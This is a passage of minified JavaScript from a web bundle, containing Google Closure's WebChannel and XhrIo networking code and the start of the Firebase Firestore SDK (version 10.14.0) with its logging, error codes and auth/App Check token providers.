u&&(d=String(u).match(MI))?(this.h=!1,el(this,d[1]||"",!0),this.o=Va(d[2]||""),this.g=Va(d[3]||"",!0),tl(this,d[4]),this.l=Va(d[5]||"",!0),xI(this,d[6]||"",!0),this.m=Va(d[7]||"")):(this.h=!1,this.i=new Ua(null,this.h))}Pi.prototype.toString=function(){var u=[],d=this.j;d&&u.push(La(d,RI,!0),":");var f=this.g;return(f||d=="file")&&(u.push("//"),(d=this.o)&&u.push(La(d,RI,!0),"@"),u.push(encodeURIComponent(String(f)).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),f=this.s,f!=null&&u.push(":",String(f))),(f=this.l)&&(this.g&&f.charAt(0)!="/"&&u.push("/"),u.push(La(f,f.charAt(0)=="/"?DN:IN,!0))),(f=this.i.toString())&&u.push("?",f),(f=this.m)&&u.push("#",La(f,bN)),u.join("")};function tr(u){return new Pi(u)}function el(u,d,f){u.j=f?Va(d,!0):d,u.j&&(u.j=u.j.replace(/:$/,""))}function tl(u,d){if(d){if(d=Number(d),isNaN(d)||0>d)throw Error("Bad port number "+d);u.s=d}else u.s=null}function xI(u,d,f){d instanceof Ua?(u.i=d,TN(u.i,u.h)):(f||(d=La(d,CN)),u.i=new Ua(d,u.h))}function ke(u,d,f){u.i.set(d,f)}function nl(u){return ke(u,"zx",Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)),u}function Va(u,d){return u?d?decodeURI(u.replace(/%25/g,"%2525")):decodeURIComponent(u):""}function La(u,d,f){return typeof u=="string"?(u=encodeURI(u).replace(d,EN),f&&(u=u.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),u):null}function EN(u){return u=u.charCodeAt(0),"%"+(u>>4&15).toString(16)+(u&15).toString(16)}var RI=/[#\/\?@]/g,IN=/[#\?:]/g,DN=/[#\?]/g,CN=/[#\?@]/g,bN=/#/g;function Ua(u,d){this.h=this.g=null,this.i=u||null,this.j=!!d}function Vr(u){u.g||(u.g=new Map,u.h=0,u.i&&wN(u.i,function(d,f){u.add(decodeURIComponent(d.replace(/\+/g," ")),f)}))}n=Ua.prototype,n.add=function(u,d){Vr(this),this.i=null,u=Po(this,u);var f=this.g.get(u);return f||this.g.set(u,f=[]),f.push(d),this.h+=1,this};function NI(u,d){Vr(u),d=Po(u,d),u.g.has(d)&&(u.i=null,u.h-=u.g.get(d).length,u.g.delete(d))}function PI(u,d){return Vr(u),d=Po(u,d),u.g.has(d)}n.forEach=function(u,d){Vr(this),this.g.forEach(function(f,g){f.forEach(function(S){u.call(d,S,g,this)},this)},this)},n.na=function(){Vr(this);let u=Array.from(this.g.values()),d=Array.from(this.g.keys()),f=[];for(let g=0;g<d.length;g++){let S=u[g];for(let x=0;x<S.length;x++)f.push(d[g])}return f},n.V=function(u){Vr(this);let d=[];if(typeof u=="string")PI(this,u)&&(d=d.concat(this.g.get(Po(this,u))));else{u=Array.from(this.g.values());for(let f=0;f<u.length;f++)d=d.concat(u[f])}return d},n.set=function(u,d){return Vr(this),this.i=null,u=Po(this,u),PI(this,u)&&(this.h-=this.g.get(u).length),this.g.set(u,[d]),this.h+=1,this},n.get=function(u,d){return u?(u=this.V(u),0<u.length?String(u[0]):d):d};function kI(u,d,f){NI(u,d),0<f.length&&(u.i=null,u.g.set(Po(u,d),b(f)),u.h+=f.length)}n.toString=function(){if(this.i)return this.i;if(!this.g)return"";let u=[],d=Array.from(this.g.keys());for(var f=0;f<d.length;f++){var g=d[f];let x=encodeURIComponent(String(g)),B=this.V(g);for(g=0;g<B.length;g++){var S=x;B[g]!==""&&(S+="="+encodeURIComponent(String(B[g]))),u.push(S)}}return this.i=u.join("&")};function Po(u,d){return d=String(d),u.j&&(d=d.toLowerCase()),d}function TN(u,d){d&&!u.j&&(Vr(u),u.i=null,u.g.forEach(function(f,g){var S=g.toLowerCase();g!=S&&(NI(this,g),kI(this,S,f))},u)),u.j=d}function SN(u,d){let f=new Oa;if(a.Image){let g=new Image;g.onload=y(Lr,f,"TestLoadImage: loaded",!0,d,g),g.onerror=y(Lr,f,"TestLoadImage: error",!1,d,g),g.onabort=y(Lr,f,"TestLoadImage: abort",!1,d,g),g.ontimeout=y(Lr,f,"TestLoadImage: timeout",!1,d,g),a.setTimeout(function(){g.ontimeout&&g.ontimeout()},1e4),g.src=u}else d(!1)}function AN(u,d){let f=new Oa,g=new AbortController,S=setTimeout(()=>{g.abort(),Lr(f,"TestPingServer: timeout",!1,d)},1e4);fetch(u,{signal:g.signal}).then(x=>{clearTimeout(S),x.ok?Lr(f,"TestPingServer: ok",!0,d):Lr(f,"TestPingServer: server error",!1,d)}).catch(()=>{clearTimeout(S),Lr(f,"TestPingServer: error",!1,d)})}function Lr(u,d,f,g,S){try{S&&(S.onload=null,S.onerror=null,S.onabort=null,S.ontimeout=null),g(f)}catch{}}function MN(){this.g=new dN}function xN(u,d,f){let g=f||"";try{AI(u,function(S,x){let B=S;l(S)&&(B=jp(S)),d.push(g+x+"="+encodeURIComponent(B))})}catch(S){throw d.push(g+"type="+encodeURIComponent("_badmap")),S}}function ja(u){this.l=u.Ub||null,this.j=u.eb||!1}D(ja,Bp),ja.prototype.g=function(){return new rl(this.l,this.j)},ja.prototype.i=function(u){return function(){return u}}({});function rl(u,d){wt.call(this),this.D=u,this.o=d,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.u=new Headers,this.h=null,this.B="GET",this.A="",this.g=!1,this.v=this.j=this.l=null}D(rl,wt),n=rl.prototype,n.open=function(u,d){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.B=u,this.A=d,this.readyState=1,$a(this)},n.send=function(u){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");this.g=!0;let d={headers:this.u,method:this.B,credentials:this.m,cache:void 0};u&&(d.body=u),(this.D||a).fetch(new Request(this.A,d)).then(this.Sa.bind(this),this.ga.bind(this))},n.abort=function(){this.response=this.responseText="",this.u=new Headers,this.status=0,this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),1<=this.readyState&&this.g&&this.readyState!=4&&(this.g=!1,Ba(this)),this.readyState=0},n.Sa=function(u){if(this.g&&(this.l=u,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=u.headers,this.readyState=2,$a(this)),this.g&&(this.readyState=3,$a(this),this.g)))if(this.responseType==="arraybuffer")u.arrayBuffer().then(this.Qa.bind(this),this.ga.bind(this));else if(typeof a.ReadableStream<"u"&&"body"in u){if(this.j=u.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.v=new TextDecoder;OI(this)}else u.text().then(this.Ra.bind(this),this.ga.bind(this))};function OI(u){u.j.read().then(u.Pa.bind(u)).catch(u.ga.bind(u))}n.Pa=function(u){if(this.g){if(this.o&&u.value)this.response.push(u.value);else if(!this.o){var d=u.value?u.value:new Uint8Array(0);(d=this.v.decode(d,{stream:!u.done}))&&(this.response=this.responseText+=d)}u.done?Ba(this):$a(this),this.readyState==3&&OI(this)}},n.Ra=function(u){this.g&&(this.response=this.responseText=u,Ba(this))},n.Qa=function(u){this.g&&(this.response=u,Ba(this))},n.ga=function(){this.g&&Ba(this)};function Ba(u){u.readyState=4,u.l=null,u.j=null,u.v=null,$a(u)}n.setRequestHeader=function(u,d){this.u.append(u,d)},n.getResponseHeader=function(u){return this.h&&this.h.get(u.toLowerCase())||""},n.getAllResponseHeaders=function(){if(!this.h)return"";let u=[],d=this.h.entries();for(var f=d.next();!f.done;)f=f.value,u.push(f[0]+": "+f[1]),f=d.next();return u.join(`\r
`)};function $a(u){u.onreadystatechange&&u.onreadystatechange.call(u)}Object.defineProperty(rl.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(u){this.m=u?"include":"same-origin"}});function FI(u){let d="";return K(u,function(f,g){d+=g,d+=":",d+=f,d+=`\r
`}),d}function Zp(u,d,f){e:{for(g in f){var g=!1;break e}g=!0}g||(f=FI(f),typeof u=="string"?f!=null&&encodeURIComponent(String(f)):ke(u,d,f))}function qe(u){wt.call(this),this.headers=new Map,this.o=u||null,this.h=!1,this.v=this.g=null,this.D="",this.m=0,this.l="",this.j=this.B=this.u=this.A=!1,this.I=null,this.H="",this.J=!1}D(qe,wt);var RN=/^https?$/i,NN=["POST","PUT"];n=qe.prototype,n.Ha=function(u){this.J=u},n.ea=function(u,d,f,g){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+u);d=d?d.toUpperCase():"GET",this.D=u,this.l="",this.m=0,this.A=!1,this.h=!0,this.g=this.o?this.o.g():qp.g(),this.v=this.o?dI(this.o):dI(qp),this.g.onreadystatechange=m(this.Ea,this);try{this.B=!0,this.g.open(d,String(u),!0),this.B=!1}catch(x){VI(this,x);return}if(u=f||"",f=new Map(this.headers),g)if(Object.getPrototypeOf(g)===Object.prototype)for(var S in g)f.set(S,g[S]);else if(typeof g.keys=="function"&&typeof g.get=="function")for(let x of g.keys())f.set(x,g.get(x));else throw Error("Unknown input type for opt_headers: "+String(g));g=Array.from(f.keys()).find(x=>x.toLowerCase()=="content-type"),S=a.FormData&&u instanceof a.FormData,!(0<=Array.prototype.indexOf.call(NN,d,void 0))||g||S||f.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(let[x,B]of f)this.g.setRequestHeader(x,B);this.H&&(this.g.responseType=this.H),"withCredentials"in this.g&&this.g.withCredentials!==this.J&&(this.g.withCredentials=this.J);try{jI(this),this.u=!0,this.g.send(u),this.u=!1}catch(x){VI(this,x)}};function VI(u,d){u.h=!1,u.g&&(u.j=!0,u.g.abort(),u.j=!1),u.l=d,u.m=5,LI(u),il(u)}function LI(u){u.A||(u.A=!0,At(u,"complete"),At(u,"error"))}n.abort=function(u){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.m=u||7,At(this,"complete"),At(this,"abort"),il(this))},n.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),il(this,!0)),qe.aa.N.call(this)},n.Ea=function(){this.s||(this.B||this.u||this.j?UI(this):this.bb())},n.bb=function(){UI(this)};function UI(u){if(u.h&&typeof s<"u"&&(!u.v[1]||nr(u)!=4||u.Z()!=2)){if(u.u&&nr(u)==4)aI(u.Ea,0,u);else if(At(u,"readystatechange"),nr(u)==4){u.h=!1;try{let B=u.Z();e:switch(B){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var d=!0;break e;default:d=!1}var f;if(!(f=d)){var g;if(g=B===0){var S=String(u.D).match(MI)[1]||null;!S&&a.self&&a.self.location&&(S=a.self.location.protocol.slice(0,-1)),g=!RN.test(S?S.toLowerCase():"")}f=g}if(f)At(u,"complete"),At(u,"success");else{u.m=6;try{var x=2<nr(u)?u.g.statusText:""}catch{x=""}u.l=x+" ["+u.Z()+"]",LI(u)}}finally{il(u)}}}}function il(u,d){if(u.g){jI(u);let f=u.g,g=u.v[0]?()=>{}:null;u.g=null,u.v=null,d||At(u,"ready");try{f.onreadystatechange=g}catch{}}}function jI(u){u.I&&(a.clearTimeout(u.I),u.I=null)}n.isActive=function(){return!!this.g};function nr(u){return u.g?u.g.readyState:0}n.Z=function(){try{return 2<nr(this)?this.g.status:-1}catch{return-1}},n.oa=function(){try{return this.g?this.g.responseText:""}catch{return""}},n.Oa=function(u){if(this.g){var d=this.g.responseText;return u&&d.indexOf(u)==0&&(d=d.substring(u.length)),lN(d)}};function BI(u){try{if(!u.g)return null;if("response"in u.g)return u.g.response;switch(u.H){case"":case"text":return u.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in u.g)return u.g.mozResponseArrayBuffer}return null}catch{return null}}function PN(u){let d={};u=(u.g&&2<=nr(u)&&u.g.getAllResponseHeaders()||"").split(`\r
`);for(let g=0;g<u.length;g++){if($(u[g]))continue;var f=C(u[g]);let S=f[0];if(f=f[1],typeof f!="string")continue;f=f.trim();let x=d[S]||[];d[S]=x,x.push(f)}E(d,function(g){return g.join(", ")})}n.Ba=function(){return this.m},n.Ka=function(){return typeof this.l=="string"?this.l:String(this.l)};function Ha(u,d,f){return f&&f.internalChannelParams&&f.internalChannelParams[u]||d}function $I(u){this.Aa=0,this.i=[],this.j=new Oa,this.ia=this.qa=this.I=this.W=this.g=this.ya=this.D=this.H=this.m=this.S=this.o=null,this.Ya=this.U=0,this.Va=Ha("failFast",!1,u),this.F=this.C=this.u=this.s=this.l=null,this.X=!0,this.za=this.T=-1,this.Y=this.v=this.B=0,this.Ta=Ha("baseRetryDelayMs",5e3,u),this.cb=Ha("retryDelaySeedMs",1e4,u),this.Wa=Ha("forwardChannelMaxRetries",2,u),this.wa=Ha("forwardChannelRequestTimeoutMs",2e4,u),this.pa=u&&u.xmlHttpFactory||void 0,this.Xa=u&&u.Tb||void 0,this.Ca=u&&u.useFetchStreams||!1,this.L=void 0,this.J=u&&u.supportsCrossDomainXhr||!1,this.K="",this.h=new DI(u&&u.concurrentRequestLimit),this.Da=new MN,this.P=u&&u.fastHandshake||!1,this.O=u&&u.encodeInitMessageHeaders||!1,this.P&&this.O&&(this.O=!1),this.Ua=u&&u.Rb||!1,u&&u.xa&&this.j.xa(),u&&u.forceLongPolling&&(this.X=!1),this.ba=!this.P&&this.X&&u&&u.detectBufferingProxy||!1,this.ja=void 0,u&&u.longPollingTimeout&&0<u.longPollingTimeout&&(this.ja=u.longPollingTimeout),this.ca=void 0,this.R=0,this.M=!1,this.ka=this.A=null}n=$I.prototype,n.la=8,n.G=1,n.connect=function(u,d,f,g){Mt(0),this.W=u,this.H=d||{},f&&g!==void 0&&(this.H.OSID=f,this.H.OAID=g),this.F=this.X,this.I=ZI(this,null,this.W),sl(this)};function Jp(u){if(HI(u),u.G==3){var d=u.U++,f=tr(u.I);if(ke(f,"SID",u.K),ke(f,"RID",d),ke(f,"TYPE","terminate"),qa(u,f),d=new Fr(u,u.j,d),d.L=2,d.v=nl(tr(f)),f=!1,a.navigator&&a.navigator.sendBeacon)try{f=a.navigator.sendBeacon(d.v.toString(),"")}catch{}!f&&a.Image&&(new Image().src=d.v,f=!0),f||(d.g=JI(d.j,null),d.g.ea(d.v)),d.F=Date.now(),Xu(d)}YI(u)}function ol(u){u.g&&(eg(u),u.g.cancel(),u.g=null)}function HI(u){ol(u),u.u&&(a.clearTimeout(u.u),u.u=null),al(u),u.h.cancel(),u.s&&(typeof u.s=="number"&&a.clearTimeout(u.s),u.s=null)}function sl(u){if(!CI(u.h)&&!u.s){u.s=!0;var d=u.Ga;Sa||tI(),Aa||(Sa(),Aa=!0),Rp.add(d,u),u.B=0}}function kN(u,d){return bI(u.h)>=u.h.j-(u.s?1:0)?!1:u.s?(u.i=d.D.concat(u.i),!0):u.G==1||u.G==2||u.B>=(u.Va?0:u.Wa)?!1:(u.s=ka(m(u.Ga,u,d),QI(u,u.B)),u.B++,!0)}n.Ga=function(u){if(this.s)if(this.s=null,this.G==1){if(!u){this.U=Math.floor(1e5*Math.random()),u=this.U++;let S=new Fr(this,this.j,u),x=this.o;if(this.S&&(x?(x=v(x),I(x,this.S)):x=this.S),this.m!==null||this.O||(S.H=x,x=null),this.P)e:{for(var d=0,f=0;f<this.i.length;f++){t:{var g=this.i[f];if("__data__"in g.map&&(g=g.map.__data__,typeof g=="string")){g=g.length;break t}g=void 0}if(g===void 0)break;if(d+=g,4096<d){d=f;break e}if(d===4096||f===this.i.length-1){d=f+1;break e}}d=1e3}else d=1e3;d=zI(this,S,d),f=tr(this.I),ke(f,"RID",u),ke(f,"CVER",22),this.D&&ke(f,"X-HTTP-Session-Id",this.D),qa(this,f),x&&(this.O?d="headers="+encodeURIComponent(String(FI(x)))+"&"+d:this.m&&Zp(f,this.m,x)),Yp(this.h,S),this.Ua&&ke(f,"TYPE","init"),this.P?(ke(f,"$req",d),ke(f,"SID","null"),S.T=!0,Gp(S,f,null)):Gp(S,f,d),this.G=2}}else this.G==3&&(u?qI(this,u):this.i.length==0||CI(this.h)||qI(this))};function qI(u,d){var f;d?f=d.l:f=u.U++;let g=tr(u.I);ke(g,"SID",u.K),ke(g,"RID",f),ke(g,"AID",u.T),qa(u,g),u.m&&u.o&&Zp(g,u.m,u.o),f=new Fr(u,u.j,f,u.B+1),u.m===null&&(f.H=u.o),d&&(u.i=d.D.concat(u.i)),d=zI(u,f,1e3),f.I=Math.round(.5*u.wa)+Math.round(.5*u.wa*Math.random()),Yp(u.h,f),Gp(f,g,d)}function qa(u,d){u.H&&K(u.H,function(f,g){ke(d,g,f)}),u.l&&AI({},function(f,g){ke(d,g,f)})}function zI(u,d,f){f=Math.min(u.i.length,f);var g=u.l?m(u.l.Na,u.l,u):null;e:{var S=u.i;let x=-1;for(;;){let B=["count="+f];x==-1?0<f?(x=S[0].g,B.push("ofs="+x)):x=0:B.push("ofs="+x);let Ae=!0;for(let pt=0;pt<f;pt++){let Ee=S[pt].g,Et=S[pt].map;if(Ee-=x,0>Ee)x=Math.max(0,S[pt].g-100),Ae=!1;else try{xN(Et,B,"req"+Ee+"_")}catch{g&&g(Et)}}if(Ae){g=B.join("&");break e}}}return u=u.i.splice(0,f),d.D=u,g}function GI(u){if(!u.g&&!u.u){u.Y=1;var d=u.Fa;Sa||tI(),Aa||(Sa(),Aa=!0),Rp.add(d,u),u.v=0}}function Xp(u){return u.g||u.u||3<=u.v?!1:(u.Y++,u.u=ka(m(u.Fa,u),QI(u,u.v)),u.v++,!0)}n.Fa=function(){if(this.u=null,WI(this),this.ba&&!(this.M||this.g==null||0>=this.R)){var u=2*this.R;this.j.info("BP detection timer enabled: "+u),this.A=ka(m(this.ab,this),u)}},n.ab=function(){this.A&&(this.A=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.M=!0,Mt(10),ol(this),WI(this))};function eg(u){u.A!=null&&(a.clearTimeout(u.A),u.A=null)}function WI(u){u.g=new Fr(u,u.j,"rpc",u.Y),u.m===null&&(u.g.H=u.o),u.g.O=0;var d=tr(u.qa);ke(d,"RID","rpc"),ke(d,"SID",u.K),ke(d,"AID",u.T),ke(d,"CI",u.F?"0":"1"),!u.F&&u.ja&&ke(d,"TO",u.ja),ke(d,"TYPE","xmlhttp"),qa(u,d),u.m&&u.o&&Zp(d,u.m,u.o),u.L&&(u.g.I=u.L);var f=u.g;u=u.ia,f.L=1,f.v=nl(tr(d)),f.m=null,f.P=!0,wI(f,u)}n.Za=function(){this.C!=null&&(this.C=null,ol(this),Xp(this),Mt(19))};function al(u){u.C!=null&&(a.clearTimeout(u.C),u.C=null)}function KI(u,d){var f=null;if(u.g==d){al(u),eg(u),u.g=null;var g=2}else if(Qp(u.h,d))f=d.D,TI(u.h,d),g=1;else return;if(u.G!=0){if(d.o)if(g==1){f=d.m?d.m.length:0,d=Date.now()-d.F;var S=u.B;g=Yu(),At(g,new mI(g,f)),sl(u)}else GI(u);else if(S=d.s,S==3||S==0&&0<d.X||!(g==1&&kN(u,d)||g==2&&Xp(u)))switch(f&&0<f.length&&(d=u.h,d.i=d.i.concat(f)),S){case 1:ki(u,5);break;case 4:ki(u,10);break;case 3:ki(u,6);break;default:ki(u,2)}}}function QI(u,d){let f=u.Ta+Math.floor(Math.random()*u.cb);return u.isActive()||(f*=2),f*d}function ki(u,d){if(u.j.info("Error code "+d),d==2){var f=m(u.fb,u),g=u.Xa;let S=!g;g=new Pi(g||"//www.google.com/images/cleardot.gif"),a.location&&a.location.protocol=="http"||el(g,"https"),nl(g),S?SN(g.toString(),f):AN(g.toString(),f)}else Mt(2);u.G=0,u.l&&u.l.sa(d),YI(u),HI(u)}n.fb=function(u){u?(this.j.info("Successfully pinged google.com"),Mt(2)):(this.j.info("Failed to ping google.com"),Mt(1))};function YI(u){if(u.G=0,u.ka=[],u.l){let d=SI(u.h);(d.length!=0||u.i.length!=0)&&(T(u.ka,d),T(u.ka,u.i),u.h.i.length=0,b(u.i),u.i.length=0),u.l.ra()}}function ZI(u,d,f){var g=f instanceof Pi?tr(f):new Pi(f);if(g.g!="")d&&(g.g=d+"."+g.g),tl(g,g.s);else{var S=a.location;g=S.protocol,d=d?d+"."+S.hostname:S.hostname,S=+S.port;var x=new Pi(null);g&&el(x,g),d&&(x.g=d),S&&tl(x,S),f&&(x.l=f),g=x}return f=u.D,d=u.ya,f&&d&&ke(g,f,d),ke(g,"VER",u.la),qa(u,g),g}function JI(u,d,f){if(d&&!u.J)throw Error("Can't create secondary domain capable XhrIo object.");return d=u.Ca&&!u.pa?new qe(new ja({eb:f})):new qe(u.pa),d.Ha(u.J),d}n.isActive=function(){return!!this.l&&this.l.isActive(this)};function XI(){}n=XI.prototype,n.ua=function(){},n.ta=function(){},n.sa=function(){},n.ra=function(){},n.isActive=function(){return!0},n.Na=function(){};function cl(){}cl.prototype.g=function(u,d){return new Kt(u,d)};function Kt(u,d){wt.call(this),this.g=new $I(d),this.l=u,this.h=d&&d.messageUrlParams||null,u=d&&d.messageHeaders||null,d&&d.clientProtocolHeaderRequired&&(u?u["X-Client-Protocol"]="webchannel":u={"X-Client-Protocol":"webchannel"}),this.g.o=u,u=d&&d.initMessageHeaders||null,d&&d.messageContentType&&(u?u["X-WebChannel-Content-Type"]=d.messageContentType:u={"X-WebChannel-Content-Type":d.messageContentType}),d&&d.va&&(u?u["X-WebChannel-Client-Profile"]=d.va:u={"X-WebChannel-Client-Profile":d.va}),this.g.S=u,(u=d&&d.Sb)&&!$(u)&&(this.g.m=u),this.v=d&&d.supportsCrossDomainXhr||!1,this.u=d&&d.sendRawJson||!1,(d=d&&d.httpSessionIdParam)&&!$(d)&&(this.g.D=d,u=this.h,u!==null&&d in u&&(u=this.h,d in u&&delete u[d])),this.j=new ko(this)}D(Kt,wt),Kt.prototype.m=function(){this.g.l=this.j,this.v&&(this.g.J=!0),this.g.connect(this.l,this.h||void 0)},Kt.prototype.close=function(){Jp(this.g)},Kt.prototype.o=function(u){var d=this.g;if(typeof u=="string"){var f={};f.__data__=u,u=f}else this.u&&(f={},f.__data__=jp(u),u=f);d.i.push(new yN(d.Ya++,u)),d.G==3&&sl(d)},Kt.prototype.N=function(){this.g.l=null,delete this.j,Jp(this.g),delete this.g,Kt.aa.N.call(this)};function eD(u){$p.call(this),u.__headers__&&(this.headers=u.__headers__,this.statusCode=u.__status__,delete u.__headers__,delete u.__status__);var d=u.__sm__;if(d){e:{for(let f in d){u=f;break e}u=void 0}(this.i=u)&&(u=this.i,d=d!==null&&u in d?d[u]:void 0),this.data=d}else this.data=u}D(eD,$p);function tD(){Hp.call(this),this.status=1}D(tD,Hp);function ko(u){this.g=u}D(ko,XI),ko.prototype.ua=function(){At(this.g,"a")},ko.prototype.ta=function(u){At(this.g,new eD(u))},ko.prototype.sa=function(u){At(this.g,new tD)},ko.prototype.ra=function(){At(this.g,"b")},cl.prototype.createWebChannel=cl.prototype.g,Kt.prototype.send=Kt.prototype.o,Kt.prototype.open=Kt.prototype.m,Kt.prototype.close=Kt.prototype.close,Xv=br.createWebChannelTransport=function(){return new cl},Jv=br.getStatEventTarget=function(){return Yu()},Zv=br.Event=Ri,af=br.Stat={mb:0,pb:1,qb:2,Jb:3,Ob:4,Lb:5,Mb:6,Kb:7,Ib:8,Nb:9,PROXY:10,NOPROXY:11,Gb:12,Cb:13,Db:14,Bb:15,Eb:16,Fb:17,ib:18,hb:19,jb:20},Zu.NO_ERROR=0,Zu.TIMEOUT=8,Zu.HTTP_ERROR=6,su=br.ErrorCode=Zu,yI.COMPLETE="complete",Yv=br.EventType=yI,hI.EventType=Na,Na.OPEN="a",Na.CLOSE="b",Na.ERROR="c",Na.MESSAGE="d",wt.prototype.listen=wt.prototype.K,Us=br.WebChannel=hI,hB=br.FetchXmlHttpFactory=ja,qe.prototype.listenOnce=qe.prototype.L,qe.prototype.getLastError=qe.prototype.Ka,qe.prototype.getLastErrorCode=qe.prototype.Ba,qe.prototype.getStatus=qe.prototype.Z,qe.prototype.getResponseJson=qe.prototype.Oa,qe.prototype.getResponseText=qe.prototype.oa,qe.prototype.send=qe.prototype.ea,qe.prototype.setWithCredentials=qe.prototype.Ha,Qv=br.XhrIo=qe}).apply(typeof sf<"u"?sf:typeof self<"u"?self:typeof window<"u"?window:{});var EA="@firebase/firestore";var st=class{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}};st.UNAUTHENTICATED=new st(null),st.GOOGLE_CREDENTIALS=new st("google-credentials-uid"),st.FIRST_PARTY=new st("first-party-uid"),st.MOCK_USER=new st("mock-user");var ma="10.14.0";var vi=new hl("@firebase/firestore");function qs(){return vi.logLevel}function CM(n){vi.setLogLevel(n)}function O(n,...e){if(vi.logLevel<=kn.DEBUG){let t=e.map(iE);vi.debug(`Firestore (${ma}): ${n}`,...t)}}function Ze(n,...e){if(vi.logLevel<=kn.ERROR){let t=e.map(iE);vi.error(`Firestore (${ma}): ${n}`,...t)}}function Mn(n,...e){if(vi.logLevel<=kn.WARN){let t=e.map(iE);vi.warn(`Firestore (${ma}): ${n}`,...t)}}function iE(n){if(typeof n=="string")return n;try{return function(t){return JSON.stringify(t)}(n)}catch{return n}}function z(n="Unexpected state"){let e=`FIRESTORE (${ma}) INTERNAL ASSERTION FAILED: `+n;throw Ze(e),new Error(e)}function Q(n,e){n||z()}function bM(n,e){n||z()}function H(n,e){return n}var N={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"},k=class extends aD{constructor(e,t){super(e,t),this.code=e,this.message=t,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}};var lt=class{constructor(){this.promise=new Promise((e,t)=>{this.resolve=e,this.reject=t})}};var yf=class{constructor(e,t){this.user=t,this.type="OAuth",this.headers=new Map,this.headers.set("Authorization",`Bearer ${e}`)}},o_=class{getToken(){return Promise.resolve(null)}invalidateToken(){}start(e,t){e.enqueueRetryable(()=>t(st.UNAUTHENTICATED))}shutdown(){}},s_=class{constructor(e){this.token=e,this.changeListener=null}getToken(){return Promise.resolve(this.token)}invalidateToken(){}start(e,t){this.changeListener=t,e.enqueueRetryable(()=>t(this.token.user))}shutdown(){this.changeListener=null}},a_=class{constructor(e){this.t=e,this.currentUser=st.UNAUTHENTICATED,this.i=0,this.forceRefresh=!1,this.auth=null}start(e,t){Q(this.o===void 0);let r=this.i,i=c=>this.i!==r?(r=this.i,t(c)):Promise.resolve(),o=new lt;this.o=()=>{this.i++,this.currentUser=this.u(),o.resolve(),o=new lt,e.enqueueRetryable(()=>i(this.currentUser))};let s=()=>{let c=o;e.enqueueRetryable(()=>R(this,null,function*(){yield c.promise,yield i(this.currentUser)}))},a=c=>{O("FirebaseAuthCredentialsProvider","Auth detected"),this.auth=c,this.o&&(this.auth.addAuthTokenListener(this.o),s())};this.t.onInit(c=>a(c)),setTimeout(()=>{if(!this.auth){let c=this.t.getImmediate({optional:!0});c?a(c):(O("FirebaseAuthCredentialsProvider","Auth not yet detected"),o.resolve(),o=new lt)}},0),s()}getToken(){let e=this.i,t=this.forceRefresh;return this.forceRefresh=!1,this.auth?this.auth.getToken(t).then(r=>this.i!==e?(O("FirebaseAuthCredentialsProvider","getToken aborted due to token change."),this.getToken()):r?(Q(typeof r.accessToken=="string"),new yf(r.accessToken,this.currentUser)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.auth&&this.o&&this.auth.removeAuthTokenListener(this.o),this.o=void 0}u(){let e=this.auth&&this.auth.getUid();return Q(e===null||typeof e=="string"),new st(e)}},c_=class{constructor(e,t,r){this.l=e,this.h=t,this.P=r,this.type="FirstParty",this.user=st.FIRST_PARTY,this.I=new Map}T(){return this.P?this.P():null}get headers(){this.I.set("X-Goog-AuthUser",this.l);let e=this.T();return e&&this.I.set("Authorization",e),this.h&&this.I.set("X-Goog-Iam-Authorization-Token",this.h),this.I}},u_=class{constructor(e,t,r){this.l=e,this.h=t,this.P=r}getToken(){return Promise.resolve(new c_(this.l,this.h,this.P))}start(e,t){e.enqueueRetryable(()=>t(st.FIRST_PARTY))}shutdown(){}invalidateToken(){}},l_=class{constructor(e){this.value=e,this.type="AppCheck",this.headers=new Map,e&&e.length>0&&this.headers.set("x-firebase-appcheck",this.value)}},d_=class{constructor(e){this.A=e,this.forceRefresh=!1,this.appCheck=null,this.R=null}start(e,t){Q(this.o===void 0);let r=o=>{o.error!=null&&O("FirebaseAppCheckTokenProvider",`Error getting App Check token; using placeholder token instead. Error: ${o.error.message}`);let s=o.token!==this.R;return this.R=o.token,O("FirebaseAppCheckTokenProvider",`Received ${s?"new":"existing"} token.`),s?t(o.token):Promise.resolve()};this.o=o=>{e.enqueueRetryable(()=>r(o))};let i=o=>{O("FirebaseAppCheckTokenProvider","AppCheck detected"),this.appCheck=o,this.o&&this.appCheck.addTokenListener(this.o)};this.A.onInit(o=>i(o)),setTimeout(()=>{if(!this.appCheck){let o=this.A.getImmediate({optional:!0});o?i(o):O("FirebaseAppCheckTokenProvider","AppCheck not yet detected")}},0)}getToken(){let e=this.forceRefresh;return 